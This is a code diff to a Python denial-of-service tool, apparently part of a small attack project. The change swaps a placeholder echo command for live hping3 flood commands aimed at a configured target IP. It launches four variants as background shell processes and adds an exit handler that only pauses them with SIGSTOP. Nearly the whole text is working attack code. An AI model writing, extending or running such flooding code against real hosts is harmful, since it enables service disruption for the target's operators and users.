@@ -1,5 +1,7 @@
 import os
 import subprocess
+import signal
+import atexit
 import multiprocessing
 from config import Config
 
@@ -11,16 +13,15 @@ class DDOS():
         self.ATKcommands = []
         self.TARGETIPv4 = TARGETIPv4
         self.ATKTOOL = ATKTOOL
+        atexit.register(self.killATKprocess)
 
     def spawnATKprocess(self, mods=[], **kwargs):
         data = 1000
         freq = '--flood'
         if self.ATKTOOL == 'hping3':
             for i, val in enumerate(mods):
-                # self.ATKcommands.append(
-                #     f'hping3 {val} -d {data} {freq} {self.TARGETIPv4} &')
                 self.ATKcommands.append(
-                    f'echo {val} &')
+                    f'hping3 {val} -d {data} {freq} {self.TARGETIPv4} &')
         # elif self.ATKTOOL == 'hulk':
         #     # not supported
         #     subprocess.run(['hulk', '-site', 'http://' + self.TARGETIPv4, '-port',
@@ -30,6 +31,10 @@ class DDOS():
             # subprocess.run(val, shell=True)
             proc = subprocess.Popen(val, shell=True)
             self.PIDs.append(proc.pid)
+
+    def killATKprocess(self, **kwargs):
+        for i, val in enumerate(self.PIDs):
+            os.kill(val, signal.SIGSTOP)
 
     def pingTarget(self, **kwargs):
         pass
@@ -47,5 +52,5 @@ if __name__ == '__main__':
     print(f'Start DDoS attack to {config.ATKIPv4} with {config.ATKTOOL}')
     ddos = DDOS(config.ATKIPv4, config.ATKTOOL)
     ddos.spawnATKprocess(mods=['', '-0', '-1', '-2'])
-    print(ddos.ATKcommands)
-    print(ddos.PIDs)
+    # print(ddos.ATKcommands)
+    # print(ddos.PIDs)
